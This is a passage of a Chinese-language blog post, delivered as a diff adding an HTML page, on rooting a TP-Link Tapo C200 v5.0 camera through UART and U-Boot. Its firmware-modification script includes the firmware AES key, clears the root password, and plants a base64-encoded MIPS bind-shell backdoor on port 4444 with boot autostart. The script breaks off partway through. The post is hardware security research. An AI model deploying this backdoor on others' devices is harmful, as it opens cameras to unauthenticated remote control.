@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>TP-Link Tapo C200 v5.0 固件安全研究 | CuO</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="一、拆机 &amp; 焊接 UART拿到摄像头： 去掉外壳：  看到UART：  从 RX 和 TX 到 CPU 的线路上有一个 0 欧姆电阻，但他们工厂不填充（所以没有连接）。因此先把线路焊接上：  ok那里线路焊上了。  二、拿本地 root shell启动流程： 1U-Boot → kernel → &#x2F;etc&#x2F;preinit（挂载文件系统）→ &#x2F;sbin&#x2F;init → &#x2F;etc&#x2F;init.d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TP-Link Tapo C200 v5.0 固件安全研究">
+<meta property="og:url" content="https://cuo-kokomi.github.io/2026/06/21/tapo-c200-root/index.html">
+<meta property="og:site_name" content="CuO">
+<meta property="og:description" content="一、拆机 &amp; 焊接 UART拿到摄像头： 去掉外壳：  看到UART：  从 RX 和 TX 到 CPU 的线路上有一个 0 欧姆电阻，但他们工厂不填充（所以没有连接）。因此先把线路焊接上：  ok那里线路焊上了。  二、拿本地 root shell启动流程： 1U-Boot → kernel → &#x2F;etc&#x2F;preinit（挂载文件系统）→ &#x2F;sbin&#x2F;init → &#x2F;etc&#x2F;init.d">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cuo-kokomi.github.io/3db3b0bb37fb2b0eea3eb567369af049.jpg">
+<meta property="og:image" content="https://cuo-kokomi.github.io/407e6ff8e10863e3ea71985768d7140a.jpg">
+<meta property="og:image" content="https://cuo-kokomi.github.io/image-20260617230405791.png">
+<meta property="og:image" content="https://cuo-kokomi.github.io/858ed7e6094836e8a6ed6761e1737b81.jpg">
+<meta property="og:image" content="https://cuo-kokomi.github.io/image-20260617221647651.png">
+<meta property="og:image" content="https://cuo-kokomi.github.io/image-20260617230608539.png">
+<meta property="og:image" content="https://cuo-kokomi.github.io/image-20260617231307706.png">
+<meta property="og:image" content="https://cuo-kokomi.github.io/f83db479954a67e0b486c987a72f0042.png">
+<meta property="og:image" content="https://cuo-kokomi.github.io/image-20260620232634043.png">
+<meta property="og:image" content="https://cuo-kokomi.github.io/image-20260620233432146.png">
+<meta property="og:image" content="https://cuo-kokomi.github.io/6843611644741083f03b35add7e751d1.png">
+<meta property="og:image" content="https://cuo-kokomi.github.io/b05413ef7bf5b88d8fd2a5051b8e9bd0.png">
+<meta property="og:image" content="https://cuo-kokomi.github.io/6daad0333294ff1242a6416f4bab8e9c.png">
+<meta property="og:image" content="https://cuo-kokomi.github.io/86faf84cbfba83c114f0c0b9f985044d.png">
+<meta property="og:image" content="https://cuo-kokomi.github.io/202ba5cbfa2eddc03660f60a948bd418.png">
+<meta property="og:image" content="https://cuo-kokomi.github.io/0824c37dd51fe231146138adcb517946.png">
+<meta property="og:image" content="https://cuo-kokomi.github.io/af0e8fde87947df9ed60949bc5958a63.png">
+<meta property="article:published_time" content="2026-06-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-21T14:20:57.770Z">
+<meta property="article:author" content="陈祥锐">
+<meta property="article:tag" content="IoT">
+<meta property="article:tag" content="U-Boot">
+<meta property="article:tag" content="UART">
+<meta property="article:tag" content="固件安全">
+<meta property="article:tag" content="逆向工程">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cuo-kokomi.github.io/3db3b0bb37fb2b0eea3eb567369af049.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="CuO" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">CuO</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://CuO-kokomi.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-tapo-c200-root" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/06/21/tapo-c200-root/" class="article-date">
+  <time class="dt-published" datetime="2026-06-20T16:00:00.000Z" itemprop="datePublished">2026-06-21</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Security-Research/">Security Research</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      TP-Link Tapo C200 v5.0 固件安全研究
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="一、拆机-焊接-UART"><a href="#一、拆机-焊接-UART" class="headerlink" title="一、拆机 &amp; 焊接 UART"></a>一、拆机 &amp; 焊接 UART</h2><p>拿到摄像头：<br><img src="/3db3b0bb37fb2b0eea3eb567369af049.jpg" alt="3db3b0bb37fb2b0eea3eb567369af049"></p>
+<p>去掉外壳：</p>
+<p><img src="/407e6ff8e10863e3ea71985768d7140a.jpg" alt="407e6ff8e10863e3ea71985768d7140a"></p>
+<p>看到UART：</p>
+<p><img src="/image-20260617230405791.png" alt="image-20260617230405791"></p>
+<p>从 RX 和 TX 到 CPU 的线路上有一个 0 欧姆电阻，但他们工厂不填充（所以没有连接）。因此先把线路焊接上：</p>
+<p><img src="/858ed7e6094836e8a6ed6761e1737b81.jpg" alt="858ed7e6094836e8a6ed6761e1737b81"></p>
+<p>ok那里线路焊上了。</p>
+<hr>
+<h2 id="二、拿本地-root-shell"><a href="#二、拿本地-root-shell" class="headerlink" title="二、拿本地 root shell"></a>二、拿本地 root shell</h2><p>启动流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U-Boot → kernel → /etc/preinit（挂载文件系统）→ /sbin/init → /etc/init.d/rcS → /bin/main（管理 WiFi、摄像头）</span><br></pre></td></tr></table></figure>
+
+<p>用cu连接串口：</p>
+<p><img src="/image-20260617221647651.png" alt="image-20260617221647651"></p>
+<p>这里拼手速，复制好slp，显示<code>autoboot in 1 second</code>的时候立马粘贴，成功进U-Boot shell：</p>
+<p><img src="/image-20260617230608539.png" alt="image-20260617230608539"></p>
+<p><img src="/image-20260617231307706.png" alt="image-20260617231307706"></p>
+<p>然后执行了下面的命令（上图）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sf probe</span><br><span class="line">sf <span class="built_in">read</span> 0x80600000 0x70200 0x200000</span><br><span class="line">setenv bootargs <span class="string">&#x27;earlyprintk console=ttyS1,115200n8 mem=46M@0x0 rmem=18M@0x2e00000 rootwait nprofile_irq_duration=on rootfstype=squashfs ro mtdparts=spi_nor.0 root=/dev/mtdblock6 rw spdev=/dev/mtdblock7 noinitrd init=/bin/ash&#x27;</span></span><br><span class="line">bootm 0x80600000</span><br></pre></td></tr></table></figure>
+
+<p>解释：</p>
+<ul>
+<li>sf probe — 初始化 SPI Flash</li>
+<li>sf read — 把内核镜像从 Flash 读到内存</li>
+<li>setenv bootargs — 设置启动参数，关键是 init&#x3D;&#x2F;bin&#x2F;ash 替代了原来的 init&#x3D;&#x2F;etc&#x2F;preinit，内核直接启动 ash shell 而不是正常的初始化流程</li>
+<li>bootm — 启动内核</li>
+</ul>
+<p>内核启动后直接得到 # 提示符，就是 root shell，不需要密码。</p>
+<p><img src="/f83db479954a67e0b486c987a72f0042.png" alt="f83db479954a67e0b486c987a72f0042"></p>
+<p>成功拿到本地 root shell！</p>
+<hr>
+<h2 id="三、为了本地永久-root-shell-设置-saveenv-导致的严重后果"><a href="#三、为了本地永久-root-shell-设置-saveenv-导致的严重后果" class="headerlink" title="三、为了本地永久 root shell 设置 saveenv 导致的严重后果"></a>三、为了本地永久 root shell 设置 saveenv 导致的严重后果</h2><p>在第二步中，我们拿到了一个本地的root shell，但是我觉得每次重启都得跑一遍那些命令很麻烦，于是把启动参数环境变量用saveenv永久写入：</p>
+<p><img src="/image-20260620232634043.png" alt="image-20260620232634043"></p>
+<p>没错，这样确实使得每次启动都能进本地root shell，方便调试，但是saveenv有个很严重的问题，会覆盖出厂的默认环境变量！！</p>
+<p>这一步让我们卡了好久。</p>
+<p>ai分析：</p>
+<p><strong>原因</strong>：<code>saveenv</code> 覆盖了出厂 U-Boot 环境分区中的关键数据（可能包括 WiFi 校准信息或正确的默认 bootargs）。  </p>
+<p>正常情况下，开机之后，在wifi列表里就可以看到tapo-cam-6554</p>
+<p><img src="/image-20260620233432146.png" alt="image-20260620233432146"></p>
+<p>但是执行<code>saveenv</code>这个之后，再启动就再也看不到了，wifi列表里没有。。</p>
+<hr>
+<h2 id="四、saveenv-的修复之临时方案"><a href="#四、saveenv-的修复之临时方案" class="headerlink" title="四、saveenv 的修复之临时方案"></a>四、saveenv 的修复之临时方案</h2><p>遇到第三步说的困难之后，尝试许久，只能把报错日志发给ai，ai表示启动参数应该设置为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setenv bootargs <span class="string">&#x27;console=ttyS1,115200n8 mem=41M@0x0 rmem=23M@0x2900000 noinitrd init=/etc/preinit rootfstype=squashfs root=/dev/mtdblock6 rw spdev=/dev/mtdblock7&#x27;</span></span><br><span class="line"><span class="built_in">printenv</span> bootargs</span><br></pre></td></tr></table></figure>
+
+<p>这是一个让 main 正常启动 + WiFi 工作的 bootargs</p>
+<p>进uboot执行后开机，实测成功了（加上后面留后门的步骤），但是这不还是有个问题，每次启动都得进uboot。。</p>
+<p>这个方案虽然能用，但不满足”远程持久化”的目标，每次断电重启都需要物理连接 UART 进 U-Boot 手动输入命令。要彻底解决，必须修改固件本身，让系统在不依赖特定 bootargs 的情况下也能正确挂载 <code>sp_rom </code>并启动 WiFi。</p>
+<p>怎么做会在 “<strong>六、[7&#x2F;8] 修改 preinit — spdev fallback</strong>“ 处理。</p>
+<hr>
+<h2 id="五、提取固件"><a href="#五、提取固件" class="headerlink" title="五、提取固件"></a>五、提取固件</h2><p>先把固件 dump 出来，准备好 SD 卡，插上，进 U-Boot：</p>
+<p><img src="/6843611644741083f03b35add7e751d1.png" alt="6843611644741083f03b35add7e751d1"></p>
+<p>执行了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sf probe</span><br><span class="line">sf <span class="built_in">read</span> 0x80600000 0 0x800000</span><br><span class="line">mmc write 0x80600000 0 0x4000</span><br></pre></td></tr></table></figure>
+
+<p>这里有个小坑，<code>mmc write</code>最后得写<code>0x4000</code>，因为直接写16384也会被当成16进制（就像图片中一样<code>count 91012</code>）</p>
+<p>然后sd卡接上电脑，在mac上把它读取出来：</p>
+<p><img src="/b05413ef7bf5b88d8fd2a5051b8e9bd0.png" alt="b05413ef7bf5b88d8fd2a5051b8e9bd0"></p>
+<p><img src="/6daad0333294ff1242a6416f4bab8e9c.png" alt="6daad0333294ff1242a6416f4bab8e9c"></p>
+<p>得到<code>dump.bin</code>。</p>
+<h3 id="踩过的坑："><a href="#踩过的坑：" class="headerlink" title="踩过的坑："></a>踩过的坑：</h3><p>一开始在Linux shell 中 dump，但是这个 shell 是个极简环境，没有正常的文件系统挂载，很多东西不能用。</p>
+<p>（尝试了挂载等等去弄，但是最后卡在了WIFI AP模块加载不了，失败了所以没有截图）</p>
+<p>选择在 U-Boot 中 dump 固件而非在 Linux shell 中 dump，原因如下：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Linux (ash) 中 dump</th>
+<th>U-Boot 中 dump</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>命令</td>
+<td><code>dd if=/dev/mtdblock6 of=rootfs.bin</code></td>
+<td><code>sf read 0x80600000 0 0x800000</code></td>
+</tr>
+<tr>
+<td>rootfs 头 512 字节</td>
+<td><strong>已解密</strong>（SoC 硬件自动解密）</td>
+<td><strong>加密原文</strong></td>
+</tr>
+<tr>
+<td>需要先有 shell</td>
+<td>是（需要先 init&#x3D;&#x2F;bin&#x2F;ash）</td>
+<td>否（U-Boot 随时可用）</td>
+</tr>
+<tr>
+<td>可 dump 全部分区</td>
+<td>是</td>
+<td>是</td>
+</tr>
+<tr>
+<td>mshell.sh 兼容</td>
+<td>否（需跳过解密步骤）</td>
+<td>是（脚本按加密数据设计）</td>
+</tr>
+</tbody></table>
+<p>ai解释：</p>
+<p>Ingenic T23 的 SPI 控制器有硬件透明解密功能。Linux 内核的 MTD 驱动启用了此功能，<br>所以通过 &#x2F;dev&#x2F;mtdblock6 读到的数据是已解密的明文。<br>而 U-Boot 的 sf read 直接读原始 Flash，不经过硬件解密，拿到的是加密数据。</p>
+<p>mshell.sh 的输入是 U-Boot dump（加密头），脚本内部处理解密和重新加密。<br>如果用 Linux dump（明文头），需要跳过解密步骤，但写回时仍需加密——不如直接用 U-Boot dump 简单统一。经验+1</p>
+<p>补充一下在 Linux shell 里 dump 的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 挂载基础文件系统（init=/bin/ash 启动后这些都没有）</span></span><br><span class="line">mount -t proc proc /proc            <span class="comment"># 挂载 /proc，后续命令需要读取系统信息</span></span><br><span class="line">mount -t sysfs sysfs /sys           <span class="comment"># 挂载 /sys，设备驱动需要</span></span><br><span class="line">mount -t tmpfs tmpfs /dev           <span class="comment"># 挂载 /dev，用于创建设备节点</span></span><br><span class="line">mdev -s                             <span class="comment"># 自动扫描并创建 /dev 下的设备节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载 sp_rom 以获取 SD 卡驱动模块</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /sp_rom</span><br><span class="line">mount -t squashfs /dev/mtdblock7 /sp_rom   <span class="comment"># sp_rom 里存放着内核模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 SD 卡驱动（内核没有内置，需要手动 insmod）</span></span><br><span class="line">insmod /sp_rom/lib/modules/3.10.14/mmc_core.ko    <span class="comment"># MMC 核心模块</span></span><br><span class="line">insmod /sp_rom/lib/modules/3.10.14/mmc_block.ko   <span class="comment"># MMC 块设备模块</span></span><br><span class="line">insmod /sp_rom/lib/modules/3.10.14/jzmmc_v12.ko   <span class="comment"># 君正 T23 的 MMC 控制器驱动</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 SD 卡设备节点并挂载</span></span><br><span class="line"><span class="built_in">mknod</span> /dev/mmcblk0 b 179 0          <span class="comment"># SD 卡整盘设备</span></span><br><span class="line"><span class="built_in">mknod</span> /dev/mmcblk0p1 b 179 1        <span class="comment"># SD 卡第一个分区</span></span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/sd</span><br><span class="line">mount -t vfat /dev/mmcblk0p1 /tmp/sd   <span class="comment"># 挂载 SD 卡到 /tmp/sd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dump 整个 Flash 到 SD 卡</span></span><br><span class="line"><span class="built_in">cat</span> /dev/mtdblock11 &gt; /tmp/sd/live_dump.bin   <span class="comment"># mtdblock11 是整个 Flash 的虚拟设备</span></span><br><span class="line"><span class="built_in">sync</span>                                           <span class="comment"># 确保数据写入 SD 卡</span></span><br></pre></td></tr></table></figure>
+
+<p>可见十分麻烦，但是<code>live_dump.bin</code>也能成功拿到。后续处理加密和保证WIFI AP模块加载，这俩stuck里很久，便还是采取在 U-Boot 中 dump 固件。</p>
+<hr>
+<h2 id="六、修改固件"><a href="#六、修改固件" class="headerlink" title="六、修改固件"></a>六、修改固件</h2><p>这一步参考了这篇文章：<a target="_blank" rel="noopener" href="https://quentinkaiser.be/security/2025/07/25/rooting-tapo-c200/">https://quentinkaiser.be/security/2025/07/25/rooting-tapo-c200/</a></p>
+<p>我们需要在 rootfs 中改 4 个东西，每个都有明确原因：</p>
+<table>
+<thead>
+<tr>
+<th>改什么</th>
+<th>为什么改这个</th>
+<th>为什么不改别的</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/etc/passwd</code> 清除密码</td>
+<td>允许无密码 root 登录</td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>/usr/sbin/bindshell</code> 植入后门</td>
+<td>348 字节的 bind shell，监听 4444 端口</td>
+<td>不用 busybox（1.6MB 太大，超出分区限制）</td>
+</tr>
+<tr>
+<td><code>/etc/init.d/rcS</code> 加自启动</td>
+<td>rcS 是启动脚本入口，最简单的自启动位置</td>
+<td>不改 S20main 等脚本，避免影响 main 的正常启动</td>
+</tr>
+<tr>
+<td><code>/etc/preinit</code> 加 spdev fallback</td>
+<td>preinit 是唯一解析 spdev 参数的地方</td>
+<td>不改 &#x2F;bin&#x2F;main（二进制文件，patch 风险高且不必要）</td>
+</tr>
+</tbody></table>
+<p>然后再由 ai 优化一下：</p>
+<hr>
+<h3 id="mshell-sh"><a href="#mshell-sh" class="headerlink" title="mshell.sh"></a>mshell.sh</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># C200 v5.0 rootfs modification script</span></span><br><span class="line"><span class="comment"># Usage: ./mshell.sh dump.bin</span></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> &lt;dump.bin&gt;&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">BLOCK_SIZE=512</span><br><span class="line">ROOTFS_START=0x1b0000</span><br><span class="line">ROOTFS_END=0x3d0000</span><br><span class="line">ROOTFS_SIZE=$(( ROOTFS_END - ROOTFS_START ))</span><br><span class="line">AES_KEY=54505f4c494e4b383869363637676e74</span><br><span class="line">AES_IV=55aadeadc0de4c494e5558457854aa55</span><br><span class="line"></span><br><span class="line">REPACKED=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>.repacked&quot;</span></span><br><span class="line">SQUASHFS=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>.root.squashfs&quot;</span></span><br><span class="line">MOD_SQUASHFS=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>.root.squashfs.mod&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bindshell (MIPS LE, port 4444, 348 bytes)</span></span><br><span class="line">BINDSHELL_B64=<span class="string">&quot;f0VMRgEBAQAAAAAAAAAAAAIACAABAAAAVABAADQAAAAAAAAAABAAADQAIAABAAAAAAAAAAEAAAAAAAAAAABAAAAAQABcAQAAXAEBAAcAAAAAAAEAwP+9J2luCDwvYgg1IACor2gACDwvcwg1JACorwIACDQAAKivBACorwgAoK8GEAI0AQAENCUooAMMAAAAJYBAABQAoK8YAKCvHACgrxFcCDwCAAg1EACorwAAsK8QAKgnBACorxAACDQIAKivBhACNAIABDQlKKADDAAAAAAAsK8BAAg0BACorwYQAjQEAAQ0JSigAwwAAAAAALCvBACgrwgAoK8GEAI0BQAENCUooAMMAAAAJYhAAN8PAjQlICACAAAFNAwAAADfDwI0JSAgAgEABTQMAAAA3w8CNCUgIAICAAU0DAAAACAAqCcoAKivLACgr6sPAjQgAKQnKAClJwAABjQMAAAA&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[1/8] Decrypting rootfs header&quot;</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=<span class="string">&quot;<span class="variable">$1</span>&quot;</span> bs=<span class="variable">$BLOCK_SIZE</span> skip=$((ROOTFS_START / BLOCK_SIZE)) count=1 status=none | \</span><br><span class="line">    openssl enc -aes-128-cfb1 -d -nosalt -nopad -K <span class="variable">$AES_KEY</span> -iv <span class="variable">$AES_IV</span> &gt; <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>.head&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[2/8] Extracting rootfs&quot;</span></span><br><span class="line"><span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>.head&quot;</span> of=<span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span> bs=<span class="variable">$BLOCK_SIZE</span> seek=$((ROOTFS_START / BLOCK_SIZE)) conv=notrunc status=none</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=<span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span> of=<span class="string">&quot;<span class="variable">$SQUASHFS</span>&quot;</span> bs=<span class="variable">$BLOCK_SIZE</span> skip=$((ROOTFS_START / BLOCK_SIZE)) count=$((ROOTFS_SIZE / BLOCK_SIZE)) status=none</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[3/8] Unpacking SquashFS&quot;</span></span><br><span class="line"><span class="built_in">rm</span> -rf squashfs-root</span><br><span class="line">unsquashfs -quiet <span class="string">&quot;<span class="variable">$SQUASHFS</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[4/8] Clearing root password&quot;</span></span><br><span class="line">sed -i <span class="string">&#x27;&#x27;</span> <span class="string">&#x27;s|^root:[^:]*:|root::|&#x27;</span> squashfs-root/etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[5/8] Installing bindshell&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$BINDSHELL_B64</span>&quot;</span> | <span class="built_in">base64</span> -d &gt; squashfs-root/usr/sbin/bindshell</span><br><span class="line"><span class="built_in">chmod</span> 755 squashfs-root/usr/sbin/bindshell</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[6/8] Patching rcS (bindshell autostart)&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &gt;&gt; squashfs-root/etc/init.d/rcS &lt;&lt; <span class="string">&#x27;RCSEOF&#x27;</span></span><br><span class="line"><span class="built_in">cp</span> /usr/sbin/bindshell /tmp/bindshell</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp/bindshell</span><br><span class="line">/tmp/bindshell&amp;</span><br><span class="line">RCSEOF</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[7/8] Patching preinit (spdev fallback)&quot;</span></span><br><span class="line">python3 &lt;&lt; <span class="string">&#x27;PYEOF&#x27;</span></span><br><span class="line">with open(<span class="string">&#x27;squashfs-root/etc/preinit&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) as f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">out = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    out.append(line)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;spdev=$(awk&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">        out.append(<span class="string">&#x27;    [ &quot;$spdev&quot; = &quot;&quot; ] &amp;&amp; spdev=&quot;/dev/mtdblock7&quot;\n&#x27;</span>)</span><br><span class="line">with open(<span class="string">&#x27;squashfs-root/etc/preinit&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">    f.writelines(out)</span><br><span class="line">PYEOF</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[8/8] Rebuilding rootfs&quot;</span></span><br><span class="line"><span class="built_in">rm</span> -f <span class="string">&quot;<span class="variable">$MOD_SQUASHFS</span>&quot;</span></span><br><span class="line">mksquashfs squashfs-root <span class="string">&quot;<span class="variable">$MOD_SQUASHFS</span>&quot;</span> -quiet -comp xz</span><br><span class="line"></span><br><span class="line">MOD_SIZE=$(<span class="built_in">stat</span> -f%z <span class="string">&quot;<span class="variable">$MOD_SQUASHFS</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$MOD_SIZE</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$ROOTFS_SIZE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[-] ERROR: SquashFS too large (<span class="variable">$MOD_SIZE</span> &gt; <span class="variable">$ROOTFS_SIZE</span>)&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;    SquashFS size: <span class="variable">$MOD_SIZE</span> / <span class="variable">$ROOTFS_SIZE</span> bytes&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero bs=<span class="variable">$BLOCK_SIZE</span> seek=$((ROOTFS_START / BLOCK_SIZE)) count=$((ROOTFS_SIZE / BLOCK_SIZE)) of=<span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span> conv=notrunc status=none</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=<span class="string">&quot;<span class="variable">$MOD_SQUASHFS</span>&quot;</span> bs=<span class="variable">$BLOCK_SIZE</span> count=1 status=none | \</span><br><span class="line">    openssl enc -aes-128-cfb1 -e -nosalt -nopad -K <span class="variable">$AES_KEY</span> -iv <span class="variable">$AES_IV</span> | 